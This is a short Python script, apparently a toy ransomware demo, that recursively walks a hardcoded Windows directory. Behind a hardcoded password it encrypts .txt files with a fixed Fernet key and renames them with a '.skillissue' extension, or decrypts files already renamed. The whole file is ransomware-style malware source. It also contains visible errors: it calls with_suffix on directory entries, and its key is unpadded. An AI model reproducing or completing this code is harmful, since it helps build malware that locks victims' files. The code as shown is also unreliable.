import os
from cryptography.fernet import Fernet
from pathlib import Path

# Manually enter your Fernet key here as a bytes object
# For example, Fernet.generate_key() generates a new key,
# but you can replace it with a key that you generated before
MANUAL_FERNET_KEY = '7YcQu1c94E2rJx3o9VCZ62A0L2rVYuMYa5W3H1IVyhQ'

def encrypt_decrypt(dataFile, fernet_key):
    with open(dataFile, 'rb') as f:
        data = f.read()

    cipher_suite = Fernet(fernet_key)

    # Check the file extension to decide whether to encrypt or decrypt
    if dataFile.name.endswith('.txt.skillissue'):
        # Decrypt the file if it has the '.txt.skillissue' extension
        decrypted_data = cipher_suite.decrypt(data)

        # Remove the '.skillissue' extension after decryption
        decrypted_file = dataFile.with_suffix('')
        with open(decrypted_file, 'wb') as f:
            f.write(decrypted_data)
        print(f"Decrypted: {dataFile}")
    elif dataFile.name.endswith('.txt'):
        # Encrypt the file if it has the '.txt' extension
        encrypted_data = cipher_suite.encrypt(data)

        # Add the '.skillissue' extension after encryption
        encrypted_file = dataFile.with_suffix('.txt.skillissue')
        with open(encrypted_file, 'wb') as f:
            f.write(encrypted_data)
        print(f"Encrypted: {dataFile}")

def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        elif entry.is_dir():
            yield from scanRecurse(entry.path)

def main():
    # For demonstration purposes, we'll use "password123" as the correct password
    correct_password = "password123"

    # Get the password from the user
    print("Enter the password:")
    password = input()

    if password != correct_password:
        print("Incorrect password. Exiting.")
        return

    # The password is correct, proceed with the encryption and decryption operations.
    directory = 'C:/Users/Admin/Desktop/python/Ransomware/fernet'  # Change this to the directory containing the files to be processed
    for item in scanRecurse(directory):
        encrypt_decrypt(item, MANUAL_FERNET_KEY)

if __name__ == "__main__":
    main()
